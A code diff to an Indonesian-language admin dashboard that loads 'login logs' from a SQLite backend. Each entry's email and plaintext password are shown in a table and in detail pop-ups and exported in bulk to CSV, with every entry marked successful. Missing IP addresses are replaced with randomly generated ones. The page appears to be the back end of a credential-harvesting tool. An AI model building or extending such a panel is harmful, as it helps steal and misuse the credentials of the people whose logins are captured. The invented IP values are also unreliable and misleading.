@@ -99,6 +99,93 @@
             background: #f8f9fa;
         }
         
+        /* Login Logs Table Styles */
+        .content-section {
+            margin: 30px auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            padding: 25px;
+        }
+        
+        .section-header {
+            margin-bottom: 20px;
+        }
+        
+        .section-header h2 {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .section-header p {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+        
+        .data-table th,
+        .data-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .data-table th {
+            background: #f8f9fa;
+            color: #444;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .data-table td {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .data-table tr:hover {
+            background: #f8f9fa;
+        }
+        
+        .status-badge {
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .status-success {
+            background: #e3f9e5;
+            color: #1b804d;
+        }
+        
+        .status-failed {
+            background: #ffe9e9;
+            color: #cc3333;
+        }
+        
+        .refresh-button {
+            background: #662a81;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .refresh-button:hover {
+            background: #7b3297;
+        }
+        
 
         
         .main-content {
@@ -482,21 +569,27 @@
         });
         
         function loadLogs() {
-            // Load data from file JSON melalui server
+            // Load data dari database SQLite melalui server
             fetch('/get-data?type=all')
                 .then(response => response.json())
                 .then(data => {
-                    // Load login logs
+                    console.log('Data dari server:', data);
+                    
+                    // Load login logs dari database SQLite
                     if (data.loginLogs && data.loginLogs.loginLogs) {
                         allLogs = data.loginLogs.loginLogs;
+                        console.log('Login logs loaded:', allLogs.length);
                     } else {
+                        console.log('No login logs data from server, using localStorage fallback');
                         allLogs = JSON.parse(localStorage.getItem('loginLogs') || '[]');
                     }
                     
-                    // Load users
+                    // Load users dari database SQLite
                     if (data.users && data.users.users) {
                         allUsers = data.users.users;
+                        console.log('Users loaded:', allUsers.length);
                     } else {
+                        console.log('No users data from server, using localStorage fallback');
                         allUsers = JSON.parse(localStorage.getItem('users') || '[]');
                     }
                     
@@ -552,8 +645,8 @@
                             ${log.platform}
                         </span>
                     </td>
-                    <td>${formatDate(log.timestamp || log.loginTime)}</td>
-                    <td>${getRandomIP()}</td>
+                    <td>${formatDate(log.timestamp || log.login_time)}</td>
+                    <td>${log.ip_address || getRandomIP()}</td>
                     <td>
                         <span class="status-badge status-active">Berhasil</span>
                     </td>
@@ -715,7 +808,7 @@
             const log = allLogs.find(l => l.id === logId);
             if (log) {
                 const passwordText = log.password ? `Password: ${log.password}` : 'Password: Tidak tersedia';
-                const ipText = log.ipAddress ? `IP Address: ${log.ipAddress}` : `IP Address: ${getRandomIP()}`;
+                const ipText = log.ip_address ? `IP Address: ${log.ip_address}` : `IP Address: ${getRandomIP()}`;
                 
                 alert(`
 Detail Login:
@@ -723,9 +816,9 @@ Nama: ${log.name || 'Unknown User'}
 Email: ${log.email}
 ${passwordText}
 Platform: ${log.platform}
-Waktu Login: ${formatDate(log.timestamp || log.loginTime)}
+Waktu Login: ${formatDate(log.timestamp || log.login_time)}
 ${ipText}
-User Agent: ${log.userAgent || 'Tidak tersedia'}
+User Agent: ${log.user_agent || 'Tidak tersedia'}
 Status: Berhasil
                 `);
             }
@@ -747,10 +840,10 @@ Status: Berhasil
                 "Nama,Email,Password,Platform,Waktu Login,IP Address,User Agent,Status\n" +
                 allLogs.map(log => {
                     const password = log.password || 'Tidak tersedia';
-                    const ipAddress = log.ipAddress || getRandomIP();
-                    const userAgent = log.userAgent || 'Tidak tersedia';
+                    const ipAddress = log.ip_address || getRandomIP();
+                    const userAgent = log.user_agent || 'Tidak tersedia';
                     
-                    return `"${log.name || 'Unknown User'}","${log.email}","${password}","${log.platform}","${formatDate(log.timestamp || log.loginTime)}","${ipAddress}","${userAgent}","Berhasil"`;
+                    return `"${log.name || 'Unknown User'}","${log.email}","${password}","${log.platform}","${formatDate(log.timestamp || log.login_time)}","${ipAddress}","${userAgent}","Berhasil"`;
                 }).join("\n");
             
             const encodedUri = encodeURI(csvContent);
